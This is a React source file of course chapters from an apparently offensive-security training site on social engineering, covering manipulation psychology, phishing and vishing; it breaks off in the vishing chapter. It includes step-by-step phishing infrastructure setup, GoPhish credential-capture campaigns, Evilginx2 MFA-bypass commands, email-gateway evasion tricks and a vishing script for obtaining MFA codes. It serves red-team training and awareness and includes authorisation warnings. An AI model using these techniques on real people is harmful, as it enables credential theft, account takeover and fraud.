'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '@/app/components/ModuleCodex'

const accent = '#ff6ec7'

const mono = 'JetBrains Mono, monospace'

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#9a8a9a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem', fontFamily: 'sans-serif' }}>{children}</p>
)

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: mono, fontSize: '1.05rem', fontWeight: 600, color: accent, marginTop: '2.5rem', marginBottom: '0.9rem' }}>
    <span style={{ color: '#3a0028', marginRight: '8px' }}>//</span>{children}
  </h2>
)

const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: mono, fontSize: '0.82rem', fontWeight: 600, color: '#cc55a0', marginTop: '1.75rem', marginBottom: '0.6rem' }}>
    &#9658; {children}
  </h3>
)

const Note = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(255,110,199,0.05)', border: '1px solid rgba(255,110,199,0.2)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', marginTop: '0.5rem' }}>
    <div style={{ fontFamily: mono, fontSize: '9px', color: '#ff6ec7', letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0, fontFamily: 'sans-serif' }}>{children}</p>
  </div>
)

const Warn = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(255,65,54,0.05)', borderLeft: '3px solid #ff4136', padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.5rem 0', border: '1px solid rgba(255,65,54,0.2)', borderLeftColor: '#ff4136' }}>
    <div style={{ fontFamily: mono, fontSize: '9px', color: '#ff4136', letterSpacing: '0.2em', marginBottom: '6px' }}>WARNING</div>
    <div style={{ color: '#9a8a9a', fontSize: '0.85rem', lineHeight: 1.7, fontFamily: 'sans-serif' }}>{children}</div>
  </div>
)

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: mono, fontSize: '9px', color: '#6a4a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#080408', border: '1px solid #3a0028', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: mono, fontSize: '0.75rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #3a0028' }}>
          {headers.map((h, i) => (
            <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: accent, fontWeight: 600, fontSize: '0.7rem' }}>{h}</th>
          ))}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #1a0014', background: i % 2 === 0 ? 'transparent' : 'rgba(255,110,199,0.02)' }}>
            {row.map((cell, j) => (
              <td key={j} style={{ padding: '8px 12px', color: '#9a8a9a', verticalAlign: 'top' }}>{cell}</td>
            ))}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

const chapters: CodexChapter[] = [
  {
    id: 'ch01-psychology',
    title: 'Psychology of Manipulation',
    difficulty: 'BEGINNER',
    readTime: '18 min',
    content: (
      <div>
        <P>Social engineering is the art of manipulating people into taking actions they would not normally take. Unlike exploiting software, it targets the human operating the software. It is consistently the number one initial access vector in real-world breaches - because a person can be tricked even when the technology is perfectly secure.</P>
        <Note>Understanding social engineering psychology is both how attackers think and what defenders must teach. The same principles that make SE attacks effective are the ones that security awareness training must address. An attack works because of human wiring - not stupidity. Anyone can be manipulated by a sufficiently well-crafted pretext.</Note>

        <H2>Cialdini's 7 Principles of Influence - Weaponised</H2>
        <P>Robert Cialdini identified the core psychological levers of persuasion. Social engineers weaponise each one systematically. Knowing them lets you both construct attacks and recognise when you are being targeted.</P>

        <Pre label="// CIALDINI'S 7 PRINCIPLES - ATTACK APPLICATIONS">{`# 1. RECIPROCITY
# People feel obligated to return favours
# Give first: "helpful" document, useful info, a small favour
# Victim feels compelled to comply with the subsequent ask
# Example: attacker helps desk resolve a minor issue first,
#          then asks for a password reset on an account they need
# Malicious attachment inside a genuinely helpful email

# 2. COMMITMENT / CONSISTENCY
# Once people commit, they act consistently with that commitment
# Get small commitments first, then escalate gradually
# "Can you confirm your username?" -> "Confirm your department?"
# -> "I need the verification code that just arrived on your phone"
# Each small yes makes the next bigger yes more likely

# 3. SOCIAL PROOF
# People follow what others appear to be doing
# "Your colleagues have already updated their credentials"
# "All other team members completed this mandatory security check"
# Normalises the malicious action, removes the victim's hesitation
# Works especially well with new employees or uncertain targets

# 4. AUTHORITY
# People comply with those they perceive as having power or expertise
# Impersonate: IT dept, CEO, auditor, government regulator, vendor
# "This is Sarah from IT Security - we detected a breach on your account"
# "The CFO needs this wire transferred before the board meeting"
# Combine with urgency for maximum effect

# 5. LIKING / RAPPORT
# People are more easily persuaded by those they like
# Mirror speech patterns, reference shared interests, compliment
# "I saw you went to X uni - I know people there"
# Spend time building relationship BEFORE the ask
# Attackers who invest in rapport get far higher compliance rates

# 6. SCARCITY / URGENCY
# People act fast when time or opportunity appears limited
# "Your account will be locked in 24 hours - click to prevent"
# "This approval needs to happen before the board meeting in 30 min"
# Creates panic -> bypasses rational thinking -> skips verification
# The more urgent the demand, the less time victim has to reflect

# 7. UNITY (Cialdini added 2016)
# People act in line with their group identity
# "As a fellow engineer, you understand why this needs to happen fast"
# "We are all on the same team here - help me out"
# Appeals to in-group identity lower defences dramatically`}</Pre>

        <H2>Cognitive Biases Exploited</H2>
        <Table
          headers={['BIAS', 'DEFINITION', 'HOW ATTACKERS EXPLOIT IT']}
          rows={[
            ['Anchoring', 'First information received disproportionately influences judgement', 'Establish false premise early: "Your account was flagged yesterday" - victim anchors to this as true'],
            ['Availability Heuristic', 'Events we can easily recall feel more likely', 'Reference recent real breach news: "Like the breach at Company X last week" - makes threat feel credible'],
            ['Confirmation Bias', 'People seek info that confirms existing beliefs', 'Frame attack around what victim already believes: IT always calls about security issues'],
            ['Authority Bias', 'Automatic deference to perceived authority', 'Impersonate senior roles: CEO, director, auditor, government official'],
            ['Framing Effect', 'Same information feels different based on how it is presented', '"Lose access to your account" vs "Keep your account active" - loss framing creates more urgency'],
            ['Inattentional Blindness', 'Under cognitive load, people miss obvious signs', 'Target busy periods: Monday morning, end of quarter, during incidents'],
          ]}
        />

        <H2>Dual Process Theory - Why Fast Thinking Gets People Hacked</H2>
        <P>Daniel Kahneman's dual process theory (System 1 vs System 2) explains exactly why social engineering works at a neurological level. System 1 is the fast, automatic, emotional brain. System 2 is the slow, deliberate, analytical brain. Social engineering forces victims into System 1 by removing time to think.</P>

        <Pre label="// SYSTEM 1 vs SYSTEM 2 - THE COGNITIVE ATTACK SURFACE">{`# SYSTEM 1 (Fast thinking - automatic):
# - Operates on shortcuts and heuristics
# - Handles routine tasks without conscious effort
# - Activated by: familiarity, urgency, emotion, authority
# - Bypasses scepticism when pressured or familiar patterns match
#
# SYSTEM 2 (Slow thinking - deliberate):
# - Analytical, careful, checks facts
# - Activated by: unusual requests, time to think, low stress
# - DEFENDERS WANT VICTIMS IN SYSTEM 2
# - ATTACKERS WANT VICTIMS IN SYSTEM 1
#
# Social engineering techniques that force System 1:
# - Urgency: "You have 10 minutes before your account is deleted"
# - Familiarity: match exact email format of IT department
# - Authority: impersonate figure victim respects
# - Cognitive load: target when victim is already overwhelmed
# - Emotional activation: fear, greed, embarrassment
#
# How to defend: Build System 2 activation habits
# - Pause before acting on any urgent request
# - Verify through a second independent channel
# - Treat urgency as a red flag, not a reason to comply`}</Pre>

        <H2>Emotional Triggers Used in SE Attacks</H2>
        <Table
          headers={['TRIGGER', 'EXAMPLE PRETEXT', 'EFFECTIVENESS']}
          rows={[
            ['Fear', '"Your account has been compromised - act now"', 'Very high - activates fight/flight, disables scepticism'],
            ['Urgency', '"This expires in 15 minutes"', 'Very high - removes deliberation time'],
            ['Curiosity', '"See what was said about you in this document"', 'High - almost impossible to resist clicking'],
            ['Greed', '"You have a pending payment of $847 waiting"', 'High - especially effective targeting financially stressed'],
            ['Helpfulness', 'Attacker frames themselves as needing help', 'Medium-high - especially targets with service roles'],
            ['Embarrassment avoidance', '"Prevent this problem being traced back to you"', 'High - works on conscientious, rule-following employees'],
            ['Social belonging', '"Everyone on the team has already done this"', 'Medium - strong in hierarchical organisations'],
          ]}
        />

        <H2>Trust Establishment Techniques</H2>
        <P>Before any ask, skilled social engineers invest heavily in establishing trust. This phase is often longer than the actual attack phase and is what separates professional social engineers from script kiddies sending obvious phishing emails.</P>

        <Pre label="// RAPPORT BUILDING AND TRUST TECHNIQUES">{`# Mirroring: subtly match the target's communication style
# - If they are formal, be formal
# - If they use specific jargon, use it back
# - Match their pace, tone, and vocabulary
# Example: target says "ping me" -> attacker says "I will ping you"
#          instead of "I will contact you"

# Pacing and leading:
# First match where they are (pacing), then gently steer (leading)
# "I know you must be incredibly busy with end-of-quarter..."
# [pause, let them confirm] "...that is exactly why I want to make
# this as quick as possible for you - I just need one thing"

# Name-dropping from OSINT:
# "I was just speaking to Emma in finance about this"
# "Mark in DevOps said you would be the right person to ask"
# Real names from LinkedIn create instant credibility

# Active listening signals on calls:
# "Uh-huh", "I see", "Right, of course" - signal attention
# Repeat back what they said in different words
# Validates their experience, lowers defences

# Pretext consistency:
# Have full backstory ready: full name, company, department, ticket number
# Be consistent across multiple interactions
# If challenged: stay calm, do not over-explain, redirect with authority`}</Pre>

        <H2>The SE Attack Lifecycle</H2>
        <Pre label="// COMPLETE ATTACK LIFECYCLE">{`# Phase 1: Target Research
# - LinkedIn: job title, reporting chain, technologies used, activity
# - Company website: team page, press releases, job postings
# - Social media: personal details, schedule, relationships
# - OSINT tools: TheHarvester, Hunter.io, Maltego
# Goal: build complete profile to make pretext believable

# Phase 2: Pretext Development
# - Choose attack vector: email / phone / in-person
# - Build cover story with verifiable details from research
# - Prepare backup stories for challenges
# - Register infrastructure: domains, phone numbers
# Goal: pretext must answer "why would this person contact me?"

# Phase 3: Initial Contact
# - Hook: get attention, establish credibility fast
# - Approach: match the communication channel norms
# - Rapport: establish connection before making any ask
# Goal: victim trusts the contact is legitimate

# Phase 4: Exploitation
# - Make the ask - keep it as small as possible first
# - Use psychological principles to overcome hesitation
# - Escalate gradually if needed (foot-in-door technique)
# Goal: victim takes the desired action

# Phase 5: Cleanup
# - Close the interaction naturally to avoid suspicion
# - Remove traces: delete sent emails, cancel fake domains
# - Ensure victim has no reason to report or investigate
# Goal: attack goes undetected as long as possible

# WHY SE SUCCEEDS WHERE TECHNICAL CONTROLS FAIL:
# - Technical controls validate credentials, not intent
# - A legitimate user performing a malicious action bypasses all controls
# - Policies assume good faith - SE exploits that assumption
# - Speed of attack outpaces deliberate thought`}</Pre>

        <H2>Human Factors That Reduce Vigilance</H2>
        <Table
          headers={['FACTOR', 'IMPACT ON SECURITY']}
          rows={[
            ['High cognitive load', 'Busy employees take mental shortcuts, skip verification steps'],
            ['Multitasking', 'Divided attention means security cues are missed'],
            ['Time pressure', 'Rushing forces System 1 thinking - scepticism disabled'],
            ['High stress environment', 'Stress hormones impair analytical thinking, increase compliance'],
            ['Help desk training', 'Trained to be helpful and resolve issues fast - exploitable'],
            ['Hierarchical culture', 'Employees reluctant to challenge authority or ask questions'],
            ['New employee status', 'Do not know normal processes yet - cannot detect abnormal requests'],
            ['End of day/week fatigue', 'Decision fatigue increases compliance with unusual requests'],
          ]}
        />
      </div>
    ),
    takeaways: [
      'Cialdini\'s 7 principles (Reciprocity, Commitment, Social Proof, Authority, Liking, Scarcity, Unity) are the core levers of every social engineering attack.',
      'Dual process theory explains why urgency works: forcing System 1 (fast/emotional) thinking bypasses System 2 (analytical/sceptical) processing.',
      'Trust establishment through mirroring, rapport building, and name-dropping from OSINT is more important than technical skill in successful SE.',
      'The SE attack lifecycle is: target research - pretext development - initial contact - exploitation - cleanup. Each phase requires preparation.',
      'Human factors like cognitive load, multitasking, and hierarchical culture create predictable windows of vulnerability that attackers time attacks around.',
    ],
  },

  {
    id: 'ch02-phishing',
    title: 'Phishing - Complete Methodology',
    difficulty: 'INTERMEDIATE',
    readTime: '22 min',
    labLink: '/modules/social-engineering/lab',
    content: (
      <div>
        <P>Phishing is the most common form of social engineering attack. It uses fake communications - primarily email - that appear to come from trusted sources to steal credentials, deploy malware, or initiate fraudulent transactions. Understanding the full methodology from infrastructure to delivery is essential for both offensive operations and defensive architecture.</P>

        <H2>Phishing Attack Taxonomy</H2>
        <Table
          headers={['TYPE', 'TARGET', 'CUSTOMISATION', 'SUCCESS RATE']}
          rows={[
            ['Phishing', 'Mass - millions of recipients', 'Generic, low effort', 'Low per target - 1-3%'],
            ['Spear Phishing', 'Specific individual or small group', 'High - uses OSINT on target', 'Very high - 20-30%+'],
            ['Whaling', 'C-suite executives specifically', 'Extreme - tailored to executive context', 'Very high - stakes match effort'],
            ['Vishing', 'Phone-based voice attack', 'Real-time adaptation', 'Highest - real-time interaction'],
            ['Smishing', 'SMS-based mobile attack', 'Medium - leverages mobile UX', 'High - SMS read rate is 98%'],
            ['Clone Phishing', 'Recipients of a real previous email', 'Clones legitimate email thread', 'High - existing trust chain exploited'],
          ]}
        />

        <H2>Email Spoofing and SPF/DKIM/DMARC</H2>
        <P>Understanding email authentication is critical - these protocols determine whether a spoofed email is delivered or dropped. The window of opportunity for spoofing depends entirely on how strictly a target organisation has configured these records.</P>

        <Pre label="// EMAIL AUTHENTICATION ANALYSIS">{`# Check target's email authentication posture:

# SPF (Sender Policy Framework) - which IPs can send for this domain:
dig TXT targetcompany.com | grep spf
# "v=spf1 include:_spf.google.com ~all"
# ~all = softfail: email accepted but marked as suspicious
# -all = hardfail: email REJECTED if from unauthorised IP
# +all = pass all (terrible config - allows anyone to send)
# ?all = neutral (no policy)
# Softfail (~all) is common and creates a spoofing window

# DKIM (DomainKeys Identified Mail) - cryptographic signature:
dig TXT selector1._domainkey.targetcompany.com
# If no record found: no DKIM signing = easier to spoof
# If present: signed emails have header verification

# DMARC (Domain-based Message Authentication):
dig TXT _dmarc.targetcompany.com
# "v=DMARC1; p=none; rua=mailto:admin@company.com"
#   p=none    -> no action (monitoring only) = spoofing possible
#   p=quarantine -> goes to spam
#   p=reject  -> hard reject = very hard to spoof FROM this domain
# Many organisations still have p=none - prime spoofing targets

# To spoof FROM targetcompany.com you need p=none or no DMARC
# Even with p=reject: you can spoof DISPLAY NAME while sending
# from a legitimate lookalike domain (display name deception)`}</Pre>

        <H2>Phishing Infrastructure Setup</H2>
        <Pre label="// BUILD PRODUCTION PHISHING INFRASTRUCTURE">{`# Domain selection strategy:
# - Typosquatting: targetcompany.com -> targetconpany.com
# - Homoglyph: targetcompany.com -> target-company.com (hyphen)
# - TLD swap: targetcompany.com -> targetcompany.net / .io
# - Subdomain abuse: company.evil-domain.com
# - Lookalike: micros0ft-helpdesk.com, paypa1.com
# Register via: Namecheap (accepts crypto), Njalla (private)
# Age domain: register weeks before campaign for email trust

# VPS selection:
# DigitalOcean, Vultr, Linode - spin up fresh instance
# Use separate IPs for sending and hosting (different reputations)
# Ensure IP is not on major blacklists before campaign

# DNS records for deliverability (critical):
# SPF:   v=spf1 ip4:YOUR_VPS_IP -all
# DKIM:  generate keys, add TXT record at selector._domainkey.domain
# DMARC: v=DMARC1; p=none; rua=mailto:admin@YOUR_DOMAIN
# MX:    mail.YOUR_DOMAIN pointing to VPS

# SSL (required for legitimate appearance):
apt install certbot
certbot certonly --standalone -d YOUR_DOMAIN.com
# Free Let's Encrypt cert - valid 90 days

# Postfix SMTP server:
apt install postfix libsasl2-modules
# Configure /etc/postfix/main.cf
# Test deliverability: mail-tester.com (aim for 8+/10 score)
# Check blacklists: mxtoolbox.com/blacklists`}</Pre>

        <H2>GoPhish - Campaign Management</H2>
        <Pre label="// GOPHISH COMPLETE SETUP">{`# Download and install:
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish*.zip && chmod +x gophish
./gophish
# Dashboard: https://localhost:3333
# Default creds: admin / gophish (change immediately)

# Campaign workflow:
# 1. Sending Profile:
#    Name: COMPANY-IT-Profile
#    SMTP: your Postfix server IP:25
#    From: IT Security Team <security@YOUR_LOOKALIKE_DOMAIN.com>
#    Test to verify email arrives and passes spam checks

# 2. Landing Page:
#    Import from URL: https://login.microsoftonline.com
#    Check "Capture Submitted Data" + "Capture Passwords"
#    Redirect URL: https://office.com (after cred capture)
#    Victim submits creds -> sees real site -> unaware

# 3. Email Template:
#    Subject: ACTION REQUIRED: Review Recent Sign-In Activity
#    HTML body: match target org's IT email template exactly
#    Include: tracking image (1x1 pixel for open tracking)
#    Include: unique link per recipient (auto-generated by GoPhish)

# 4. Users and Groups:
#    Import CSV: firstname,lastname,email,position
#    Source from: LinkedIn, Hunter.io, company website

# 5. Campaign:
#    Associate all above, set launch time
#    Schedule: Tuesday-Thursday, 9am-11am (highest open rates)
#    Launch -> GoPhish sends individually tracked emails

# 6. Real-time dashboard:
#    Email sent / opened (tracking pixel fired)
#    Link clicked / credentials submitted
#    Export report for client deliverable`}</Pre>

        <H2>HTML Email Obfuscation Techniques</H2>
        <Pre label="// BYPASSING EMAIL SECURITY GATEWAYS">{`# Zero-width characters in URLs (bypass keyword filters):
# Insert Unicode zero-width space U+200B inside flagged words
# "click\u200bhere" looks like "clickhere" in email client
# URL shorteners: bit.ly, tinyurl, cutt.ly hide final destination

# Base64 encoded content in email body:
# Some gateways do not decode base64 in HTML bodies
# Attacker encodes malicious link as base64 data: URI

# Redirect chains:
# Legitimate site redirect -> intermediate -> malicious page
# Gateway scans only first URL (legitimate) -> passes
# Example: https://google.com/url?q=MALICIOUS_URL

# HTML smuggling (most effective - modern technique):
# JavaScript assembles file in browser memory from base64 blobs
# No actual file traverses the email gateway - just HTML + JS
# Browser assembles payload locally -> antivirus cannot scan it
# Tools: smuggler.py, Mango HTML smuggler
# Bypasses: Microsoft Defender for Office 365, Proofpoint, Mimecast

# QR Code phishing (Quishing):
# Embed malicious URL in QR code image in email body
# Email gateway scans text, not images -> QR bypasses URL checks
# Victim scans with phone -> mobile browser, no corporate proxy
# Zero URL rewriting protection on most mobile devices`}</Pre>

        <H2>Evilginx2 - AiTM MFA Bypass</H2>
        <P>Evilginx2 is a man-in-the-middle attack framework that proxies the real login page. The victim interacts with the actual service, Evilginx captures the session cookie after MFA is completed. This bypasses all forms of TOTP and push notification MFA - only hardware FIDO2 keys are immune.</P>

        <Pre label="// EVILGINX2/3 PHISHLET DEPLOYMENT">{`# Evilginx operates as a reverse proxy between victim and real site
# Victim logs in to the REAL Microsoft/Google - Evilginx is in between
# After successful MFA completion, session cookie is captured
# Attacker replays cookie -> authenticated session without credentials

# Install Evilginx2:
go install github.com/kgretzky/evilginx2@latest
# Or download precompiled binary from GitHub releases

# Configure:
./evilginx2 -p ./phishlets -t ./redirectors
# Set domain: config domain YOUR_DOMAIN.com
# Set IP:     config ip YOUR_VPS_IP

# Load phishlet (Microsoft 365 example):
phishlets hostname o365 login.YOUR_DOMAIN.com
phishlets enable o365
# Phishlets available: o365, google, github, linkedin, facebook

# Create lure (unique URL per target):
lures create o365
lures get-url 0
# Returns URL like: https://login.YOUR_DOMAIN.com/RANDOM_TOKEN
# Send this URL to victim in phishing email

# After victim authenticates:
sessions
sessions 1
# Shows: username, password, session tokens, cookies
# Copy cookies to browser extension (EditThisCookie)
# Access victim's account with valid authenticated session

# Evilginx3 improvements:
# - Better detection evasion
# - Updated phishlets for modern auth flows
# - Improved session handling for conditional access policies`}</Pre>

        <H2>Business Email Compromise (BEC)</H2>
        <Table
          headers={['BEC TYPE', 'ATTACK METHOD', 'TARGET', 'AVG LOSS']}
          rows={[
            ['CEO Fraud', 'Spoof CEO email requesting urgent wire to finance', 'CFO / Finance Director', '$125,000+'],
            ['Vendor Invoice Fraud', 'Impersonate vendor, change bank account in payment request', 'Accounts Payable', '$50k-$500k'],
            ['Account Takeover BEC', 'Compromise real mailbox, monitor for payment threads', 'Any email user', 'Varies'],
            ['Payroll Diversion', 'HR impersonation - request payroll direct deposit change', 'HR / Payroll', '$10k-$50k'],
            ['Real Estate Wire Fraud', 'Intercept closing cost wire communication, redirect funds', 'Buyers, real estate agents', '$300k+'],
          ]}
        />

        <H2>Phishing Campaign Metrics</H2>
        <Pre label="// MEASURING PHISHING CAMPAIGN SUCCESS">{`# Key metrics to track and report:

# Open rate: percentage who opened the phishing email
# Industry baseline: 15-25% (Verizon DBIR)
# Indicates: email deliverability + subject line effectiveness

# Click rate: percentage who clicked the link
# Red flag threshold: anything above 5% is concerning
# Indicates: email content quality + lack of suspicious email training

# Credential submission rate: clicked AND entered credentials
# Even more critical: how many trusted the fake page
# Indicates: landing page quality + absence of URL verification habits

# Time to click: how quickly after send did clicks arrive
# Fast clicks = System 1 triggering - urgency worked
# Slow clicks = System 2 engaged - subject line built curiosity

# Department breakdown:
# IT: should be lowest - are they?
# Finance: critical to monitor - BEC target
# HR: payroll diversion risk
# Executive assistants: high-value, high-access targets

# Detection gap:
# How long until blue team detected campaign?
# Was there ANY detection? Alert fatigue?
# Did any employees self-report suspicious emails?`}</Pre>

        <Warn>All phishing campaigns must be conducted under written authorisation. Capturing real credentials of non-consenting individuals is illegal. In authorised red team engagements, use fake landing pages that do not store real passwords - only capture that a submission occurred.</Warn>
      </div>
    ),
    takeaways: [
      'SPF softfail (~all) and missing DMARC records are the spoofing window - always check DNS records before assuming a domain cannot be spoofed.',
      'GoPhish automates the full campaign lifecycle: sending, tracking pixel opens, recording credential submissions, and generating client reports.',
      'HTML smuggling is the most effective modern attachment delivery method because it assembles payloads in browser memory, bypassing gateway scanning entirely.',
      'Evilginx2/3 bypasses TOTP and push notification MFA by proxying the real authentication session and capturing post-MFA session cookies.',
      'BEC attacks require no malware and no technical exploit - purely social engineering against financial processes, causing billions in annual losses globally.',
    ],
  },

  {
    id: 'ch03-vishing',
    title: 'Vishing and Phone-Based Attacks',
    difficulty: 'INTERMEDIATE',
    readTime: '16 min',
    content: (
      <div>
        <P>Vishing (voice phishing) uses phone calls to manipulate targets in real time. It is highly effective because voice conveys authority and humanity in ways email cannot, the interaction is live so the attacker can adapt to resistance, and victims feel social pressure not to challenge or hang up on authority figures. Real-time MFA bypass via vishing is one of the most impactful attack techniques in modern threat actor playbooks.</P>

        <Note>Vishing success rates are significantly higher than email phishing because human conversation creates trust rapidly and the real-time nature prevents the deliberate verification steps that email allows. A well-constructed vishing call can bypass even security-aware employees.</Note>

        <H2>Caller ID Spoofing</H2>
        <Pre label="// CALLER ID SPOOFING METHODS">{`# Why spoofing matters:
# Displaying an internal company number -> victim trusts the call
# Displaying known vendor (Microsoft, bank) -> authority established
# Displaying 800/1800 number -> corporate feel
# Displaying local area code -> local trust (neighbour spoofing)

# Methods:
# SpoofCard: consumer service, per-minute pricing
# SpoofTel: SIP-based spoofing
# Twilio API: programmatic, $0.01/min, any caller ID
# VOIP.ms: SIP trunk with caller ID control
# Burner: disposable number apps (US/Canada)

# SIP INVITE manipulation:
# From: header in SIP INVITE controls displayed caller ID
# Legitimate carriers may pass through without validation
# SS7 (Signaling System 7) attacks: exploit core telephony
#   protocol to reroute calls, intercept SMS OTPs
#   Requires access to SS7 network (telco-level access)
#   Used by nation-state actors and organised crime

# Legal note: Caller ID spoofing is regulated in most jurisdictions
# Truth in Caller ID Act (US): illegal to defraud/harm
# Authorised testing: document scope, get written permission`}</Pre>

        <H2>Vishing Script Framework</H2>
        <Pre label="// VISHING CALL STRUCTURE">{`# STRUCTURE: Opening -> Rapport -> Pretext -> Ask -> Close

# IT Helpdesk / MFA Bypass (most common in active attacks):
#
# Opening (establish authority immediately):
# "Hi, this is Mark calling from IT Security Operations.
#  I am calling from internal extension 4821.
#  Am I speaking with [TARGET NAME]?"
#
# Rapport (create urgency + connection):
# "I can see you are logged into your workstation right now.
#  Our SIEM picked up some unusual activity on your account -
#  looks like it might be an authentication attempt from
#  an unfamiliar location."
#
# Pretext (expand the story with OSINT details):
# "Given that you are working on the PROJECT_NAME right now,
#  access to that system would be a significant concern.
#  I want to get this resolved before it escalates."
#
# Ask (single, specific, reasonable-sounding):
# "I am going to trigger an MFA verification to your phone.
#  When you receive it, can you read the code back to me
#  so I can confirm it is the legitimate account owner?"
#
# Close (end naturally, give them something to do):
# "Perfect, that confirms it is you. I have updated the record.
#  You should be all good now. Have a good day."
#
# WHAT HAPPENED: attacker entered victim's username+password
#                (stolen from prior phish or breach data),
#                called victim, got MFA code in real time,
#                entered it -> bypassed 2FA completely`}</Pre>

        <H2>Targeted Vishing with OSINT</H2>
        <Pre label="// RESEARCH-DRIVEN VISHING">{`# Building the call dossier:
# LinkedIn: full name, title, department, manager name, direct reports
# Company website: physical address, reception number, org structure
# LinkedIn company page: recent news, acquisitions, expansions
# Job postings: internal tools used (Salesforce, Workday, SAP, Okta)
# Glassdoor: culture details, internal processes, common frustrations
# Press releases: projects, partnerships, upcoming events

# Using OSINT in the call:
# Name-drop real colleagues: "I was just speaking with Emma in finance"
# Reference real projects: "regarding the Q3 Salesforce migration"
# Use internal jargon from job postings: "your Workday instance"
# Reference org structure: "I need to loop in your manager David"
# Use real office details: "The IT team at your St Kilda Road office"

# Multi-stage vishing:
# Stage 1: Reconnaissance call
#   No ask at all - just gather information
#   "Hi, I am trying to reach the accounts payable team - who is that?"
#   "What is the best way to submit a vendor invoice?"
#   Now you have real names, processes, and email addresses
#
# Stage 2: Exploitation call
#   Use information gathered in Stage 1 for perfect pretext
#   Victim verifies you as legitimate (you know internal details)
#   Ask is framed within real internal processes`}</Pre>

        <H2>MFA Fatigue and Push Bombing</H2>
        <P>MFA fatigue attacks exploit the design of push notification MFA systems. The attacker repeatedly sends authentication push requests to the victim's device until the victim approves one - either out of confusion about why notifications keep arriving, or out of frustration to make them stop.</P>

        <Pre label="// MFA PUSH BOMBING ATTACK CHAIN">{`# Prerequisites:
# Attacker has valid username AND password (from prior phish / breach)
# Target uses push notification MFA (Duo, Microsoft Authenticator, etc.)
# Push: victim receives notification asking to approve login

# Attack sequence:
# 1. Attacker enters credentials -> push sent to victim's phone
# 2. Victim receives push -> sees "Approve sign-in?" -> denies
# 3. Attacker re-enters credentials -> another push
# 4. Victim receives again -> confused, denies
# 5. Attacker calls victim: "Hi IT Security - you may be seeing
#    authentication prompts on your phone - can you approve
#    the next one so I can verify your identity?"
# 6. Victim approves -> MFA bypassed
#
# OR: victim approves just to stop the notifications (fatigue)
# No call required if victim is sufficiently overwhelmed

# Real-world example: Uber breach (2022)
# Attacker obtained contractor credentials from dark web
# Sent repeated MFA push notifications
# Then WhatsApp messaged the victim claiming to be IT
# Victim approved push -> full network access achieved
# Led to complete network compromise, internal data theft

# Defences:
# Number matching: push shows code that must match screen
# Additional context: push shows IP + location of login attempt
# Require re-authentication after X failed MFA attempts
# Migrate from push to FIDO2 hardware keys`}</Pre>

        <H2>Deepfake Voice and Real-Time Cloning</H2>
        <Pre label="// VOICE CLONING FOR VISHING">{`# ElevenLabs (current best quality):
# - Clone voice from ~1 minute of audio
# - Source: YouTube, podcast, conference talk, earnings call
# - Create new voice profile -> generate audio from text
# - Application: executive impersonation calls
# - $5/month tier sufficient for red team purposes

# Resemble AI:
# - Real-time voice conversion (changes your voice to cloned voice live)
# - RVC (Retrieval Voice Conversion) models: open source, local
# - RVC + Audacity: real-time voice morphing on phone call

# VoiceMod / Clownfish:
# - Consumer real-time voice changers
# - Route through virtual audio device on softphone
# - Gender swap, age change, accent modification

# Documented real-world attacks:
# - $25M fraud: Hong Kong finance employee approved wire transfer
#   after video call with "CFO" - entire board was deepfake
# - UK energy company CEO fraud: $243k transferred after
#   voice call from "parent company CEO" - AI voice clone
# - Growing use in BEC operations for verbal confirmation calls

# Detection:
# Audio artefacts: subtle compression, breathing inconsistencies
# Background noise: too clean or inconsistent
# Micro-pause patterns: AI text-to-speech has distinctive rhythm
# Challenge questions: ask about something not in training data
# Code words pre-arranged out-of-band with executives`}</Pre>

        <H2>Callback Phishing (BazarCall)</H2>
        <Pre label="// BAZARCALL TECHNIQUE">{`# BazarCall / Callback Phishing workflow:
# 1. Victim receives email:
#    "Your subscription has been charged $349.99
#     To dispute this charge, call 1-800-NUM-HERE"
#
# 2. Victim calls the number (attacker-controlled call centre)
#    Attacker answers as "BestBuy Geek Squad" or "Norton Support"
#
# 3. Social engineering on call:
#    "To process your refund, I need to verify your account.
#     Please go to this website and download our verification tool."
#    Tool = remote access trojan (BazarLoader, Cobalt Strike)
#
# 4. Attacker now has remote access to victim's workstation
#
# Why effective:
# - Victim INITIATED the call (no suspicion of cold call)
# - Email contains no malicious link (bypasses email scanning)
# - Victim is emotionally invested (wants their money back)
# - Attacker has full call control in live interaction
#
# Threat actors using this: BazarCall group, Quantum ransomware
# Targets: primarily businesses for ransomware deployment`}</Pre>

        <Warn>Vishing without written authorisation is illegal in all jurisdictions. Recording calls may require all-party consent depending on location. Engagement rules of engagement must specify vishing scope explicitly before any calls are made.</Warn>
      </div>
    ),
    takeaways: [
      'Vishing achieves higher success rates than email phishing because real-time conversation builds trust rapidly and victims feel social pressure not to challenge authority figures.',
      'MFA push bombing (fatigue attack) bypasses push notification MFA without any phishing infrastructure - just valid credentials plus repeated authentication attempts.',
